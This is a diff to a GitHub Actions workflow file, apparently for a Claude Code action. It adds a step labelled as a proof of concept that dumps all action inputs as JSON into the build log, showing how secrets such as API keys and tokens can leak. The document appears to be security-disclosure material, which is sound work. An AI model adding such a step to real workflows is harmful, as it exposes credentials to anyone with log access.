@@ -252,6 +252,16 @@ runs:
         echo "/usr/bin" >> "$GITHUB_PATH"
         echo "/bin" >> "$GITHUB_PATH"
 
+    # ★★★ PoC: ALL_INPUTS dump — demonstrates secret leakage ★★★
+    - name: PoC — dump ALL_INPUTS
+      shell: bash
+      env:
+        ALL_INPUTS: ${{ toJson(inputs) }}
+      run: |
+        echo "=== ALL_INPUTS (from \${{ toJson(inputs) }}) ==="
+        echo "$ALL_INPUTS"
+        echo "=== END ALL_INPUTS ==="
+
     - name: Run Claude Code Action
       id: run
       shell: bash
@@ -430,3 +440,4 @@ runs:
           -H "Authorization: Bearer ${{ steps.run.outputs.github_token }}" \
           -H "X-GitHub-Api-Version: 2022-11-28" \
           ${GITHUB_API_URL:-https://api.github.com}/installation/token
+          
